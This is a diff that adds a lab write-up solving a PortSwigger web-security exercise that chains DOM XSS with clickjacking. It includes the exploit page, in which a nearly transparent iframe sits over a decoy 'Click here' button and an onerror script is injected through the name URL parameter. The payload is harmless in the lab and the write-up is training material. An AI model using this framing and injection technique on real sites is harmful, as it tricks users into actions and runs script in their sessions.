@@ -114,8 +114,40 @@
 **First,We need to identify where the application is vulnerable to XSS and inject a script that calls window.print() Then, use this vulnerable page in a clickjacking attack so that, after the victim submits the feedback form, the injected script triggers the print dialog.** <br>
 ### Soln:
 **->After accessing the lab, click on ‘Submit feedback’. A webpage is displayed containing input fields for Name, Email, Subject, and Message, along with a button to submit the feedback** <br>
+<img width="1241" height="427" alt="image" src="https://github.com/user-attachments/assets/7f69893f-d5ae-498d-aa2e-1b59638968e0" /><br>
 **-> Initially, enter random values in the input fields and submit the feedback. It was observed that a message is displayed containing the value entered in the Name field** <br>
-**-> 
+<img width="570" height="131" alt="image" src="https://github.com/user-attachments/assets/d485b104-7bac-477f-9aa0-8cfa129ada8e" /><br>
+**-> Let's inject the XSS script of alert and check whether is it able to execute it or not..** <br>
+<img width="742" height="462" alt="image" src="https://github.com/user-attachments/assets/1e3c57fd-939b-42dd-a024-5f3198e78539" /><br>
+**-> After submiting the result we obtained tells that it is vulnerable to DOM XSS** <br>
+<img width="742" height="462" alt="image" src="https://github.com/user-attachments/assets/eb8defad-b286-4035-a878-3c3aab321b65" /><br>
+**-> we need to fill the input field with a value automatically before the user enters anything by adding the parameter to the URL and then load that URL inside the iframe and the script is injected in the "name" parameter**<br>
+## Script:
+```
+<style>
+     iframe {
+			position: absolute;
+			width: 900px;
+			height: 900px;
+			top: 10px;
+			left: 100px;
+			opacity: 0.001;
+			z-index: 2;
+     }
+     div {
+           position: absolute;
+           top: 810px;
+           left: 150px;
+           z-index: 1;
+</style>
+  <div>Click here</div>
+  <iframe src="https://0add007e0426232c804f7b07008e00fa.web-security-academy.net/feedback?name=<img src=0 onerror='window.print()'>&email=frank@gmail.com&subject=ddd&message=rrrf"></iframe>
+```
+**->  After injecting the Script make sure that "Click here" option and "submit feedback" option are aligned properly, if not adjust using "top,left" objects**<br>
+**-> after submiting the feedback the image tries to load 0 as 0 isn't a valid image, the browser fires the image's error event to load(i.e, now the error event will load)** <br>
+### The lab is solved ✅<br><br>
+
+
 
 
 
